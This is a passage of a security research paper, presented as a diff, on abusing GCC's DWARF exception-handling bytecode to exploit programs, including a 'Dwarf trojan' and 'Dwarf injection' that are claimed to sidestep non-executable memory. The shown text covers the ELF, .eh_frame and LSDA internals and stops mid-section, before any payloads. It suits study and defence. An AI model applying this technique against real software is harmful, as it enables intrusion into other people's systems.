@@ -1,0 +1,1831 @@
+Overwriting the Exception Handling Cache Pointer - Dwarf Oriented Programming
+	Version 1.0
+
+
+James Oakley (Electron)
+Sergey Bratus (@SergeyBratus)
+Rodrigo Branco (@BSDaemon)
+
+
+
+                "I'll never stop to be amazed by the amount
+                 of effort people put into not understanding things"
+                    Mark Dowd
+
+------[  Index
+
+  0 - Abstract
+
+  1 - Introduction
+    1.1 - Paper structure
+
+  2 - Concepts and Additions 
+    2.1 - Call Frame Information
+        2.1.1 - Dwarf Tables
+        2.1.2 - Dwarf Registers
+        2.1.3 - Dwarf Rules
+    2.2 - DWARF Expressions
+    2.3 - Exception Handlers
+    2.4 - Exception Process
+	2.4.1 - Context initialization
+	2.4.2 - Stack unwinding using DWARF tables
+	2.4.3 - Overall algorithm
+	2.4.4 - Callgraph of the relevant gcc/libunwind code
+    2.5 - Playground
+
+  3 - The Techniques and Comparisons
+    3.0 - Katana and Dwarfscript
+    3.1 - Dwarf Payloads
+    3.2 - .eh_frame abusing techniques
+        3.2.1 - Using a write4 to overwrite the cache pointer
+        3.2.2 - Using a writeN to overwrite the .eh_frame
+        3.2.3 - Shellcode execution to replace .eh_frame: Avoiding
+                the usage of decoders
+        3.2.4 - Ret-into-lib to remap the .eh_frame pages as writable
+    3.3 - ROP x .eh_frame
+
+  4 - Future
+
+  5 - Acknowledgements
+
+  6 - References
+
+  7 - Downloadable Materials 
+
+------[ 0 - Abstract
+
+This paper describes a new technique for abusing the DWARF exception
+handling architecture used by the GCC tool chain. This technique can
+be used to exploit vulnerabilities in programs compiled with or linked
+to exception-enabled parts.  Exception handling information is stored
+in bytecode format, executed by a virtual machine during the course of
+exception unwinding and handling.  We show how a malicious attacker
+could gain control of those structures and inject bytecode for
+malicious purposes. This virtual machine is actually Turing-complete,
+which means that it can be made to run arbitrary attacker logic.
+
+------[ 1 - Introduction
+
+This paper demonstrates how to exploit exception handling mechanisms based on 
+DWARF. For a detailed analysis describing construction of trojaned binaries, 
+please refer to [1].  We try here to extend the aforementioned paper, but for 
+completeness we also explain all the technical details of the exception 
+handling mechanisms.  Some experience with DWARF is recommend for fully
+understanding of this paper.
+
+In this paper, we are going to discuss the standard format used in many
+Unix-based systems to represent programs on disk and their respective 
+process image in memory, the ELF format [2].
+
+An ELF binary is organized using various header information and an array of
+named sections.  Each section contains data used in a specific part of the
+process lifecycle.  For programs dependent on exceptions (such as the ones
+created using C++) the format must provide a way for the exception handling
+mechanism to occur.
+
+On Windows-like systems (such as ReactOS and Windows XP) the information is
+stored on the stack [3].  Exploitation of such mechanisms on Windows is very
+common, and ways to avoid such exploitation have been exhaustively 
+researched [4] [5].
+
+On Linux and other Unix-like systems, exception handling information is
+stored in ELF sections using a standardized format called Dwarf (Debugging
+with Attributed Records Format) [6]. Exploitation of Dwarf-based exception
+handling mechanisms had never been discussed before, and this discussion is the
+intent of the article. We would like to stress here that we are going to 
+discuss Dwarf-based EXCEPTION HANDLING, not Dwarf-based Debugging Data.
+
+When the attacker gains control over the Dwarf data, he can perform
+sophisticated computations unhindered by standard protections such as
+non-executable memory and ASLR. As we will demonstrate in this article,
+non-executable memory is completely useless against this technique. ASLR
+is still problematic, and the conditions necessary to bypass it are similar to
+the conditions needed to bypass it using other techniques (such as memleaks). 
+Nonetheless, since we need other memory area information to be leaked, it
+increases possibility of bypass in occasions when you don't control the
+information being leaked.
+
+There are two main attack vectors for abusing Dwarf-based exception handling:
+    - Dwarf Trojans -> The attacker has complete control over the binary,
+      and thus creates a malicious Dwarf section.  Since the antivirus 
+      companies are currently unaware of the technique, it cannot be 
+      detected using signatures. This attack is discussed in [1].
+    - Dwarf Injection -> The attacker has an arbitrary write in a running
+      program, allowing him to overwrite data. This ability is used to 
+      overwrite the Dwarf portion of an executable (it requires multiple 
+      writes and a writable Dwarf section map) or the information used to 
+      locate the Dwarf data (our biggest contribution). After the 
+      injection, the attacker just needs to force the vulnerable program to
+      throw an exception, and the crafted Dwarf data will be executed.
+
+In [1], the authors demonstrated that, due to the flexibility and extensibility
+of the Dwarf-based exception handling, accommodating present and future stack
+unwinding, saved registers restoration logic and bytecode support, generic 
+computations are possible. Among other things, these computations are
+capable of performing memory reading and register reading, and as such make 
+full use of the symbol information. To avoid including a huge list of 
+information for unwinding, the bytecode represents the symbolic memory 
+operations in efficient ways, thus allowing us to pack a lot of functionality 
+in small sections of data (a great feature for exploiting vulnerabilities with
+size constraints). We created a dynamic linker in less than 200 bytes, a
+size that fits within the typical .eh_frame section length.
+
+
+---[ 1.1 - Paper structure
+
+The paper is structured in a different way than [1] due to the focus being
+only on the exploitation part of the problem.
+
+In section 2 we describe the Dwarf-based exception handling mechanism, 
+detailing its internals and comparing it with other code execution mechanisms.
+We present the tools created to manipulate Dwarf data in this section (attached
+to this article).
+
+In section 3 we discuss the exploitation mechanisms, using different conditions
+in order to generalize the ideas. We give examples of vulnerable programs,
+discuss which information the attacker needs to be able to locate, and explain
+how to locate the information.
+
+
+------[ 2 - Concepts and Additions
+
+In this chapter we discuss the Dwarf-based exception handling mechanism in
+detail.
+
+We define the models used for computation and show other similar techniques
+used during exploitation.
+
+The technique presented in this article is important due to the wide use
+of gcc-like compilers (LLVM also uses Dwarf-based exception handling, and 
+Clang C++ compiler is known to be nearly fully binary compatible with gcc) on
+different Unix-based OSes (Linux, BSD, Solaris, Darwin, Cygwin) and also on
+Windows-based machines (gcc on Windows uses setjmp/longjmp (SJLJ) [7]
+exception handling [8], but Dwarf-based exception handling is also supported 
+except for the GUI callbacks - gcc on Windows does not use SEH, and gcc 4.4 
+only supports Dwarf [9]). The exception-handling data formats and processes are
+not C++ specific and are also applicable to other gcc-compiled languages
+supporting exceptions.  
+
+For discussing details we choose C++ code, compiled with GCC on Linux
+x86_64 architecture.  
+
+Traditional exploitation techniques focus either on introducing new code to
+be executed directly [10] or on manipulating the flow of execution of
+existing code [11] [12] [13]. In translation to ELF terms, the attention
+is highly focused on the executable sections of the target program and the
+libraries it loads (or can be forced to load).
+
+Besides the main computation (traditionally the target of exploitation) in
+a modern ELF file there are over 30 auxiliary sections, which contain data
+and code controlling various stages of the process life-cycle: loading,
+dynamic linking, relocation, process tear down, exception handling.
+
+The automaton responsible for performing all these tasks uses the relevant
+ELF sections as input. Previous work like locreate [14] already demonstrated
+the potential for borrowing logic from auxiliary tasks that build a process
+image (in locreate's case, relocation).  The logic of these tasks is driven
+by specialized data sections. Changing these sections will cause the 
+auxiliary tasks to do more; possibly, perform arbitrary computations.
+
+To verify if your compiler is using Dwarf-based exception handling we
+recommend the following steps (in our example, under Solaris):
+
+------------------------ Checking if Dwarf is used ------------------------
+Establish what version of Solaris we're on
+
+$ uname -a
+SunOS boson 5.11 snv_111b i86pc i386 i86pc Solaris
+
+$ cat /etc/release
+                         OpenSolaris 2009.06 snv_111b X86
+           Copyright 2009 Sun Microsystems, Inc.  All Rights Reserved.
+                        Use is subject to license terms.
+                              Assembled 07 May 2009
+
+Show a simple C++ program with an exception
+
+$ cat hello.cpp
+#include <iostream>
+
+int main(int argc,char** argv)
+{
+  try
+  {
+    std::cout<<"Hello world\n";
+    throw 1;
+  }
+  catch(int a)
+  {
+    std::cout<<"caught int "<<a<<"\n";
+  }
+}
+
+$ g++ -o hello hello.cpp
+
+$ ./hello
+Hello world
+caught int 1
+
+Examine the ELF structure of that program
+
+$ readelf -S ./hello
+There are 33 section headers, starting at offset 0x2620:
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk
+Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0
+0  0
+  [ 1] .interp           PROGBITS        080500f4 0000f4 000011 00   A  0
+0  1
+  [ 2] .SUNW_cap         LOOS+ffffff5    08050108 000108 000010 08   A  0
+0  4
+  [ 3] .hash             HASH            08050118 000118 000178 04   A  5
+0  4
+  [ 4] .SUNW_ldynsym     LOOS+ffffff3    08050290 000290 000100 10   A  6
+10  4
+  [ 5] .dynsym           DYNSYM          08050390 000390 0002d0 10   A  6
+1  4
+  [ 6] .dynstr           STRTAB          08050660 000660 0005e2 00  AS  0
+0  1
+  [ 7] .SUNW_version     VERNEED         08050c44 000c44 000050 01   A  6
+2  4
+  [ 8] .SUNW_versym      VERSYM          08050c94 000c94 00005a 02   A  5
+0  4
+  [ 9] .SUNW_dynsymsort  LOOS+ffffff1    08050cf0 000cf0 000058 04   A  4
+0  4
+  [10] .SUNW_reloc       REL             08050d48 000d48 000038 08   A  5
+0  4
+  [11] .rel.plt          REL             08050d80 000d80 0000a0 08  AI  5
+c  4
+  [12] .plt              PROGBITS        08050e20 000e20 000150 10  AX  0
+0  4
+  [13] .text             PROGBITS        08050f70 000f70 000484 00  AX  0
+0  4
+  [14] .init             PROGBITS        08051400 001400 00001d 00  AX  0
+0 16
+  [15] .fini             PROGBITS        08051420 001420 000018 00  AX  0
+0 16
+  [16] .rodata           PROGBITS        08051438 001438 00001f 00   A  0
+0  4
+  [17] .got              PROGBITS        08061458 001458 000068 04  WA  0
+0  4
+  [18] .dynamic          DYNAMIC         080614c0 0014c0 000170 08  WA  6
+0  4
+  [19] .data             PROGBITS        08061630 001630 000058 00  WA  0
+0  8
+  [20] .bssf             PROGBITS        08061688 001688 000000 00  WA  0
+0  1
+  [21] .picdata          PROGBITS        08061688 001688 000000 00  WA  0
+0  1
+  [22] .ctors            PROGBITS        08061688 001688 00000c 00  WA  0
+0  4
+  [23] .dtors            PROGBITS        08061694 001694 00000c 00  WA  0
+0  4
+  [24] .eh_frame         PROGBITS        080616a0 0016a0 000128 00  WA  0
+0  4
+  [25] .jcr              PROGBITS        080617c8 0017c8 000004 00  WA  0
+0  4
+  [26] .data.rel.local   PROGBITS        080617cc 0017cc 000004 00  WA  0
+0  4
+  [27] .gcc_except_table PROGBITS        080617d0 0017d0 000020 00  WA  0
+0  4
+  [28] .bss              NOBITS          080617f0 0017f0 0000b4 00  WA  0
+0  8
+  [29] .symtab           SYMTAB          00000000 0017f0 000720 10     30
+46  4
+  [30] .strtab           STRTAB          00000000 001f10 00048e 00   S  0
+0  1
+  [31] .comment          PROGBITS        00000000 00239e 000166 00      0
+0  1
+  [32] .shstrtab         STRTAB          00000000 002504 00011c 00   S  0
+0  1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings)
+  I (info), L (link order), G (group), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+
+
+$ readelf --debug-dump=frames ./hello
+The section .eh_frame contains:
+
+00000000 00000018 00000000 CIE
+  Version:               1
+  Augmentation:          "zPL"
+  Code alignment factor: 1
+  Data alignment factor: -4
+  Return address column: 8
+  Augmentation data:     00 60 0f 05 08 00
+
+  DW_CFA_def_cfa: r4 ofs 4
+  DW_CFA_offset: r8 at cfa-4
+
+0000001c 00000028 00000020 FDE cie=00000000 pc=0805114c..08051247
+  Augmentation data:     00 00 00 00
+continues...
+
+
+We can see that Dwarf-related information is present in the binary 
+(DW_CFA_*). We explain it below.
+---------------------------------------------------------------------------
+
+
+---[ 2.1 - Call Frame Information
+
+This paper is about exploiting auxiliary computations inside a program.
+The benefits for the attacker are due to new opportunities while exploiting a
+given vulnerability and are highly dependent on the vulnerability specifics.
+Section 3 will focus on the advantages for each scenario.
+
+In this section we explain how we can manipulate the automaton used by the
+exception-handling process, which is a Turing-complete machine, by providing
+crafted contents for the .eh_frame and .gcc_except_table ELF sections.
+
+We will discuss how the exception handling process works as implemented by gcc
+and partially standardized by the Linux Standards Base [15] and x86_64 ABI 
+[16].
+
+To handle an exception, the stack must be unwound. Walking the call
+stack following return address pointers to find all call frames is not
+efficient and does not provide execution restoration (due to the loss
+of the register state - functions contain assembly instructions before
+the return to restore callee-saved registers before returning to the
+caller, and these instructions are not going to be executed when there
+is an interrupt). It is thus a requisite that the information necessary
+to restore registers at the time of an unexpected procedure termination
+(exception thrown from within the procedure) is present at the time of
+the exception handling.
+
+It is thus a requisite that the information necessary to restore registers at
+the time of an unexpected procedure termination (exception thrown from
+within the procedure) is present at the time of the exception handling.
+
+Debuggers also require this information in order to display backtraces,
+examine local variables, and so on. That is why DWARF Call-Frame Information
+section of the Dwarf standard [6] has been adopted to encode the unwinding 
+information (there are minor changes in areas such as pointer encoding 
+[16]).
+
+GCC does not care which version of DWARF a program was compiled against (the 
+DWARF standard provides call frame information with a version number field, 
+and in .eh_frame this version number is always set to 1) unless necessary to
+resolve the layout of a structure of behavior which conflicts across standards
+(we use version 4 for this paper).
+
+As we mentioned, the information utilized by debuggers and the exception
+handling mechanism of the C++ runtime lies within a bunch of ELF sections:
+.eh_frame, .debug_frame, .gcc_except_table and many more, but this article
+deals with the first two (other DWARF related sections deal with type
+information, mappings from source code lines to ASM instructions and so
+on). The layout of .eh_frame and .debug_frame is similar.  Whatever said
+for the first also applies to the latter unless otherwise stated.
+
+Quoting [25]: "The .eh_frame section shall contain 1 or more Call
+Frame Information (CFI) records. The number of records present shall be
+determined by size of the section as contained in the section header. Each
+CFI record contains a Common Information Entry (CIE) record followed
+by 1 or more Frame Description Entry (FDE) records. Both CIEs and FDEs
+shall be aligned to an addressing unit sized boundary". This leads us
+to the following ASCII diagram that depicts the relationship between
+the various structures.
+
+         .eh_frame section
+     .-----------------------.
+     | CFI                   |    CFI = Call Frame Information
+     |     .---------------. |
+     |     | CIE           | |    CIE = Common Information Entry
+     |     '---------------' |
+     |     | FDE           | |    FDE = Frame Description Entry
+     |     |     .-------. | |
+     |     |     | *LSDA | | |    LSDA = Language Specific Data Area
+     |     |     '-------' | |
+     |     '---------------' |
+     |     | FDE           | |
+     |     |     .-------. | |
+     |     |     | *LSDA | | |
+     |     |     '-------' | |
+     |     '---------------' |
+     |     |               | |
+     |     | ...           | |
+     |     '---------------' |
+     |     | FDE           | |
+     |     |     .-------. | |
+     |     |     | *LSDA | | |
+     |     |     '-------' | |
+     |     '---------------' |
+     '-----------------------'
+
+
+FDE is a structure that holds information for a range of instruction
+pointer values and is usually used to represent debug information for
+a procedure. Nevertheless, certain compiler optimizations may result
+in one procedure being assigned several FDEs. For example, optimizing
+compilers usually split the code in "hot" and "cold" paths that are
+not contiguous. The "hot" path may be assigned a FDE separate from the
+"cold" path. If an exception is thrown in function "foo()", or in case
+a debugger wants to examine its debug information in order to unwind its
+stack frame, the FDE for "foo()" is looked up and parsed.
+
+A CIE (Common Information Entry) holds information common to several
+FDEs. For this purpose, each FDE structure contains a pointer to its
+parent CIE. Those that have experience with C compiler internals, may
+think of a CIE as the debugging information common to a 'translation unit'
+of the target program [27]. A CIE indicates the start of a CFI logical
+block. That is, a CFI (Call Frame Information) record doesn't have a
+header of its own - The term CIE is only used as a logical separation
+of a CIE along with its children FDEs.
+
+Last but not least, LSDA stands for Language Specific Data Area. Each FDE
+contains a pointer to a LSDA but it may be NULL indicating the absence
+of specific information for the FDE in question. The layout of the LSDAs
+is architecture specific but its something we're not dealing with in
+this article. On x86 and x86_64 (and probably others), LSDAs contain a
+landing-pad table in a special encoded format. The landing-pads indicate
+the address of an exception handler for a given set of instruction
+pointer values. That is, if an exception happens at 0xdeadbeef, then
+the landing-pad table will have an entry for that EIP that will encode
+the address of the exception handler as well as its type information.
+
+
+---[ 2.1.1 - Dwarf Tables
+
+The unwinding information describes a large table. The rows of the table
+correspond to machine instructions in the program text, and the columns
+correspond to registers and Canonical Frame Addresses (CFA).
+
+CFA is internally used by the Dwarf to express the canonical address for
+the call frame on the stack.
+
+The information in the rows is sufficient to restore the machine state (the
+values of the registers and the CFA) for every instruction within the previous
+call frame.
+
+Here is a simplified example of what a Dwarf table might look like:
+
+---------------------------------------------------------------------------
+PC (eip)   ||  CFA   ||  ebp      ||  (ebx)    ||  eax    || return address
+---------------------------------------------------------------------------
+0xf000f000 || rsp+16 || *(cfa-16) ||           ||         || *(cfa-8)
+0xf000f001 || rsp+16 || *(cfa-16) ||           ||         || *(cfa-8)
+0xf000f002 || rsp+16 || *(cfa-16) ||           || eax=edi || *(cfa-8)
+   ...     ||  ...   ||  ...      ||  ...      ||  ...    ||   ...
+0xf000f00a || rsp+16 || *(cfa-16) || *(cfa-24) || eax=edi || *(cfa-8)
+---------------------------------------------------------------------------
+
+The Dwarf specification largely discusses compression techniques to provide
+sufficient information at run-time to build parts of the table without the
+full information.
+
+The aforementioned compression required by the Dwarf tables is performed 
+using the concept of the Frame Description Entities (FDE) and Dwarf 
+instructions.
+
+An FDE corresponds to a logical block of the program .text and describes
+how unwinding may be done from within that block. Information common to
+many FDEs is stored in the Common Information Entity (CIE). The .eh_frame
+uses information from the versions 2 and 3 and does not include details
+added to this structure in version 4 of the standard.
+
+The FDE structure looks like this:
+
+length
+CIE_pointer
+initial_location
+address_range
+LSDA pointer (see section 2.3)
+instructions
+padding
+
+Whereas the CIE structure contains:
+
+length
+CIE_id
+version
+augmentation (string) (see section 2.3)
+address_size
+segment_size
+code_alignment_factor
+data_alignment_factor
+return_address_register
+initial_instructions
+padding
+
+
+The instructions in the FDE either specify column rules (registers) to 
+apply to all cells in that column from the initial_location to the end of 
+the procedure (unless a different rule is specified for the same 
+column/register in the sequence) or change the initial_location (thus 
+influencing how the other instructions affect the process).
+
+
+---[ 2.1.2 - Dwarf Registers
+
+An arbitrary number of registers is permitted, identified by their number.
+
+To map the Dwarf registers with the architecture-specific hardware 
+registers we need the ABI information. Some Dwarf registers do not map
+directly to a hardware register (such as the return-address in x86 
+architecture).
+
+
+---[ 2.1.3 - Dwarf Rules
+
+The Dwarf tables contain in each cell a rule detailing how the contents of
+the register will be restored for the previous call frame. There are
+several rules supported [6].
+
+Registers are restored usually from another register or from a memory
+location accessible through an offset from the CFA.
+
+
+---[ 2.2 - Dwarf Expressions
+
+Dwarf expressions were introduced in the version 3 of the Dwarf standard to 
+give flexibility in the way a register could be restored, permitting it to be
+restored to the value computed by a Dwarf expression.
+
+The expressions consist of one or more Dwarf operations (instructions) and
+are evaluated by a stack machine with instructions operating on the top items
+on the stack.
+
+Since the standard does not specify the format of the stack items, gcc uses
+architecture word-sized objects.  
+
+All basic operations used for numerical computations are available:
+    - Pushing values onto the stack
+    - Arithmetic operations
+    - Bitwise operations
+    - Stack manipulation
+
+Other instructions are available to dereference memory addresses and to 
+obtain values from Dwarf registers calculated as part of the unwinding 
+process.
+
+This functionality allows to restore registers after some arithmetics using
+values either in memory locations or in registers. It also extends the
+Dwarf rules in the sense that you are now capable of using absolute addresses
+and not only stack-relative ones.
+
+The expressions also include conditional operations and conditional branch
+instructions: all the conditions required are met to consider the Dwarf
+automaton being Turing-complete.
+
+
+---[ 2.3 - Exception Handlers
+
+Since Dwarf is a debugging format, its specification does not provide any
+mechanism for halting the unwinding process.
+
+Every CIE includes an augmentation string, which is implementation-defined
+(not defined by the standard).
+
+This augmentation string is used to control the set of previously agreed upon
+augmentations to the CIE and FDE structures being used. For our chosen case of
+Linux on x86_64, the augmentations are well-defined [15] [16].
+
+The augmentation defines a language-specific data area (LSDA) and 
+personality routine associated with every FDE (defined as pointers).
+
+During the unwinding of an FDE, the process calls the personality routine
+associated to this FDE. The routine interprets the LSDA and determines if
+a handler for the exception has been found [22].
+
+LSDA contents are not defined by any standard, and the same program may use
+completely different formats, as they will be read by separate personality
+routines (libstdc++-v3/libsupc++/eh_personality.cc).
+
+For details of the format, the gcc commented assembly code generated with
+gcc -fverbose-asm -dA is recommended.
+
+In an ELF binary, the section .gcc_except_table contains an array of LSDA.
+The text region described by an FDE is divided into call sites defined by the
+LSDA, with each call site corresponding to a code within a try block (C++
+terminology) and with a pointer to a chain of C++ typeinfo descriptors
+(again, C++ terminology). These objects are then used by the personality
+routine to determine whether the exception can be handled in the current
+frame:
+
+gcc_except_table           | LSDA 0
+-----------------          ----------------
+LSDA 0          | -------->| Header          -----> | LpStart encoding    
+LSDA 1          |          | Call Site Table -|     | LpStart
+...             |          | Action Table---| |     | TType format
+LSDA n          |          | Type Table---| | |     | TTBase
+      ------------------------------------| | |     | Call Site Format
+      |         ----------------------------| |     | Call Site Table size
+      |         |                             |     ----------------------
+      |         |     ----------------------- |
+      |         |     |----->| Call Site Record 0 -> | call site position
+      |         |            | Call Site Record 1    | call site length
+      |         |            |        ...            | landing pad position
+      |         |            | Call Site Record n    | first action
+      |         |            -------------------     ----------------------
+      |         |
+      |         |----> | action 0
+      |                | action 1
+      |                |   ...
+      |                | action n
+      |                -----------
+      |
+      |----> | typeid 0
+             | typeid 1
+             |   ...
+             | typeid n
+             -----------
+
+Arrows in the graph denote not pointers but a detailed layout of the 
+object in question.
+
+There is a separate LSDA for each try/catch block. The LSDA is made
+up of the following parts:
+   
+   | HEADER                    |
+   | --LPStart enc             |
+   | --LPStart                 |
+   | --TType format            |
+   | --TTBase                  |
+   | --CallSiteFormat          |
+   | --CallSiteTableSize       |
+   | CALL SITE TABLE           |
+   | --CallSiteRecord1         |
+   | ----call site position    |
+   | ----call site length      |
+   | ----landing pad position  |
+   | ----first action          |
+   | --CallSiteRecord2         |
+   | ....                      |
+   | --CallSiteRecordn         |
+   | ACTION TABLE              |
+   | --Action1                 |
+   | ----type filter           |
+   | ----offset to next action |
+   | --Action2                 |
+   | ....                      |
+   | --ActionN                 |
+   | TYPE TABLE                |
+   | --typeinfoN               |
+   | ....                      |
+   | --typeinfo2               |
+   | --typeinfo1               |
+
+In more detail:
+
+*** header
+    + LPStart encoding
+      Note that gcc frequently writes it to be DW_PE_omit.
+    + LPStart
+      Landing pad start pointer. Self-relative offset to beginning of
+      landing-pad code for this code fragment. Landing pad fields in
+      call-site table entries are relative to this. The lower 4 bits
+      are not part of this pointer and have a special meaning:
+      + 0000: There is a type table pointer
+      + 0001: There is no type table pointer
+    + TTypeFormat
+      This seems to be the encoding of the entries in the type table
+      (DW_PE_* values).
+    + TTBase offset
+      Self-relative offset to the *end* of the type table. The type
+      table goes from bottom to top, like a heap. This appears to
+      always be ULEB128, although this is not specified by any 
+      documentation.
+    + CallSiteFormat
+      The format (DW_PE_*) of values in entries in the call site table
+    + CallSiteTableSize
+      Number of bytes in the call site table. We believe that this
+      value is encoded according to the value of CallSiteFormat. It
+      seems to generally be uleb128.
+*** call site table
+    The call site table consists of any number of
+    entries. Conceptually, each entry corresponds to a range of text
+    addresses and specifies, for that range, where the exception
+    handler (landing pad) begins and what types of thrown objects the
+    handler can deal with. This information is encoded by an entry
+    with the following fields (their format governed by
+    CallSiteFormat).
+    + CallSiteStart
+      The text address of the beginning of this call-site, relative to
+      the start of the procedure. It is possible that this should
+      actually be LPStart-relative. Since gcc generally omits LPStart,
+      it is difficult to tell. Note that this differs from the 
+      documentation.
+    + CallSiteRange
+      Length of this call site in bytes.
+    + LandingPad
+      The address of the handler, relative to the start of the
+      procedure. It is possible that this should
+      actually be LPStart-relative. Since gcc generally omits LPStart,
+      it is difficult to tell.
+    + ActionRecordPtr
+      Byte-offset into the action table plus one. A value of 0
+      indicates no actions. When evaluating whether execution should
+      be passed to the landing pad, the action chain starting at this
+      offset can be examined.
+*** action table
+    The action table can be used as a filter to see what types can be
+    "caught" by a handler. Each action record contains two values. The
+    documentation indicates that they are both LEB-encoded.
+    + TypeFilter
+      This is used to match the type of a thrown exception to a type
+      that can be handled. It is an index into the type table
+      (starting from the bottom), which has more information about the
+      type. Note that it is an index, not a byte-offset. 
+      Unfortunately, although this seems to be a 1-based index, on
+      occasion it has a value of 0. The documentation indicates that this
+      means "match all". A comment in
+      libstdc++-v3/libsupc++/eh_personality.cc line 581 of gcc 4.5.2
+      indicates that it may just apply to cleanups and not
+      handlers.
+    + NextRecordPtr
+      Self-relative byte offset to the next action record. If 0 then
+      there is no next one.
+*** types table
+    Table of type entries indexed from the bottom up. The format of
+    each entry is described by TTypeFormat in the header. 
+** asm
+   Some of the call sites exist for the purposes of dealing with
+   re-thrown exceptions or exceptions thrown within a catch block.
+   The beginning of the normal catch handler has conditional jumps.
+
+
+---[ 2.4 - Exception Process
+
+Exception handling is a mazy process. Although the C++ standards define
+exceptions, their semantics and how they should be handled, no reference
+is made regarding the actual implementation details (obviously this is not
+what a standard should do). Consequently, each compiler suite implements
+its very own way of handling exceptions, which may also differ depending
+on the operating system. In this article we will be focusing on platforms
+that use GNU compiler toolchain and its associated runtime. Most of the
+code snippets presented below were directly ripped from the GCC source
+code and libunwind, so, our analysis applies on various operating systems.
+
+Analyzing the way exceptions are handled involves two components: gcc
+and its libstdc++/libsup++, as well as libunwind by HP. The first is
+famous for its large codebase, while the latter for its architectural
+support which makes code reading quite difficult. When an exception is
+thrown, control is passed from the libsup++ runtime to libunwind which
+is responsible for extracting, parsing and even caching the DWARF data
+for later use. C++, being an object oriented language, performs many
+magic operations transparently, without the explicit intervention of the
+programmer. Examples that fall into this category are the constructors,
+the destructors and of course, the exception handlers. In the end, the
+whole world is about bits and bytes, everything is translated in ASM and
+no high level object view is taken into account. Without further ado,
+we start with a very simple C++ code that defines one try/catch block
+and throws an exception. The relevant code snippet is shown below.
+
+  Note: Libunwind is capable of performing both local and remote
+  unwinding. The first refers to a process unwinding itself while the
+  latter involves frame inspection of a process A from another process
+  B. Additionally, libunwind is capable of handling unwind information
+  for either statically compiled languages as C or C++, or dynamically
+  compiled (interpreted) languages as Java or Python [23]. In this
+  article we are mostly interested in _local_ unwinding for _statically_
+  compiled languages, and precisely for C++.
+
+---------------------- Exception Sample Code ------------------------------
+#include <iostream>
+
+using namespace std;
+
+int main() {
+
+  try {
+    throw(1);
+  }
+  catch(int e) {
+    cout << "Hello Phrack! " << e << endl;
+  }
+
+  return 0;
+}
+---------------------------------------------------------------------------
+
+Most programmers perceive exceptions as being asynchronous events,
+kinda like POSIX signals, while they are not. Leaf functions calling
+"throw()", like "main()" in the example above, do nothing more than
+calling "__cxa_allocate_exception()" and then "__cxa_throw()". Remember
+that exceptions are classes, so the first is used to allocate space
+via "malloc()" (or via a set of buffers located in .bss if that fails,
+check "gcc-xxx/libstd++v3/libsupc++/eh_alloc.c:84"), while the latter
+is used to traverse the frames until a handler for that exception is
+eventually located. It is now apparent that no asynchronous process is
+involved. Throwing an exception means traversing the frames and calling
+a special function, nothing more, nothing less, yet the process of doing
+so, is kind of complex.
+
+As a proof, consider the following ASM snippet that corresponds to the
+simple .cpp file above (the disassembly comes from a x86_64 machine
+running Linux).
+
+
+---------------------------------------------------------------------------
+Dump of assembler code for function main:
+   ...
+   <+9>:     mov    $0x4,%edi                  # std::size_t thrown_size
+
+   # Allocates a new "__cxa_refcounted_exception" followed by 4 bytes; we
+   # do a "throw(1)", 1 being an "int" occupies 4 bytes.
+   <+14>:    callq  0x400930 <__cxa_allocate_exception@plt>
+   ...
+   <+25>:    mov    $0x0,%edx                  # void (*dest) (void *)
+   <+30>:    mov    $0x6013c0,%esi             # std::type_info *tinfo
+   <+35>:    mov    %rax,%rdi                  # void *obj
+   <+38>:    callq  0x400940 <__cxa_throw@plt>
+---------------------------------------------------------------------------
+
+
+The return value of "__cxa_allocate_exception()" returns a pointer to a
+"struct __cxa_refcounted_exception". This structure holds a reference
+count, as well as a "__cxa_exception" object, a structure used to
+represent all exceptions. A copy of the thrown object, an "int" in
+our example, follows the "exc" variable shown below. Obviously, since
+exceptions are objects thrown that also need to be cought, the copy of
+the thrown object is later used for the "catching" process.
+
+
+---------------------------------------------------------------------------
+struct __cxa_refcounted_exception
+{
+  _Atomic_word referenceCount;
+  __cxa_exception exc;
+};
+---------------------------------------------------------------------------
+
+
+          .------ Pointer returned by __cxa_refcounted_exception()
+          |
+          v
+       ---+----------------+-----+--------+---
+      ... | referenceCount | exc | object | ...
+       ---+----------------+-----+--------+---
+
+
+Control is then passed to "__cxa_throw()" that does the hard work of (a)
+initializing the current context (i.e. current value of registers) (b)
+traversing the stack until a proper handler for the exception is found.
+The following sections analyze those two tasks in more detail.
+
+
+----[ 2.4.1 - Context initialization
+
+The following figure represents part of the callgraph starting at
+"__cxa_throw()". The, not necessarily leaf, functions "unw_getcontext()"
+and "unw_init_local()" are responsible for the proper initialization of
+the current context. They may deal with OS specific structures in order
+to reshape them in machine independent libunwind objects.
+
+
+---------------------------------------------------------------------------
+__cxa_throw() 
+[gcc-xxx/libstdc++v3/libsup++/eh_throw.cc:61]
+
+    _Unwind_RaiseException() 
+    [libunwind-xxx/src/unwind/RaiseException.c:29]
+    
+        _Unwind_InitContext() [MACRO]
+        [libunwind-xxx/src/unwind/unwind-internal.h:52]
+      
+            unw_getcontext() 
+            [libunwind-xxx/src/x86_64/getcontext.S:37]
+
+            unw_init_local() 
+            [libunwind-xxx/src/x86_64/Ginit_local.c:42]
+---------------------------------------------------------------------------
+
+As it was previously mentioned, stack traversal takes place with the help
+of special DWARF tables. For the frame unwinding to begin one must know
+the current line in the aforementioned table, that is the instruction
+pointer value corresponding to the place where the exception was
+raised. The current value of EIP, along with a bunch of other registers,
+are stored in a buffer by "unw_getcontext()", a function coded in ASM,
+defined in "libunwind-1.0.1/src/x86_64/getcontext.S:37".
+
+  Note: On certain platforms (e.g. IA-64) running Linux or FreeBSD,
+  "unw_getcontext()" [24] ends up calling "getcontext(3)". The latter
+  returns context information in a structure called "ucontext_t" which
+  has different members depending on the operating system, one of them
+  being the register state. Nevertheless, "unw_getcontext()" needs to
+  provide a more highlevel view of the registers. That's why figuring
+  out how it works, involves messing up with a bunch of libunwind
+  macros which take care of the underlying OS.
+
+"unw_init_local()", among others, initializes a, so called, "struct
+cursor" (check "libunwind-xxx/include/tdep-x86_64/libunwind_i.h:77"). This
+structure holds the current state of the unwinder, including the
+DWARF state. At this point of execution no DWARF related data from the ELF
+file have been analyzed yet.  The only pieces of available information
+come from "getcontext(3)".  The various bookkeeping structures are still
+zeroed out.
+
+
+----[ 2.4.2 - Stack unwinding using DWARF tables
+
+Once the unwinding state has been initialized, the exception handling
